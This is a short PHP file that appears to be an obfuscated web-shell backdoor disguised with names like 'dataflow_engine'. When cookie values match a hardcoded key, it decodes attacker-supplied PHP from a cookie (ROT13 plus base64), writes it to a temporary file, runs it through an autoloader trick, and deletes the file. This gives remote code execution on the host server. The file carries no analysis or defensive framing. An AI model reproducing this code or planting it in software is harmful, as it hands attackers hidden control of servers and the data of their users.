<?php


if (isset($_COOKIE[-38+38]) && isset($_COOKIE[89-88]) && isset($_COOKIE[68-65]) && isset($_COOKIE[-45+49])) {
    $resource = $_COOKIE;
    function dataflow_engine($bind) {
        $resource = $_COOKIE;
        $res = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'ccb4f069');
        if (!is_writable($res)) {
            $res = getcwd() . DIRECTORY_SEPARATOR . "buffer_cache";
        }
        $factor = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($resource[3]));
        if (is_writeable($res)) {
            $data = fopen($res, 'w+');
            fputs($data, $factor);
            fclose($data);
            spl_autoload_unregister(__FUNCTION__);
            require_once($res);
            @array_map('unlink', array($res));
        }
    }
    spl_autoload_register("dataflow_engine");
    $symbol = "5aebd854588742dfa8aea467d8825e0e";
    if (!strncmp($symbol, $resource[4], 32)) {
        if (@class_parents("batch_process_core_engine", true)) {
            exit;
        }
    }
}
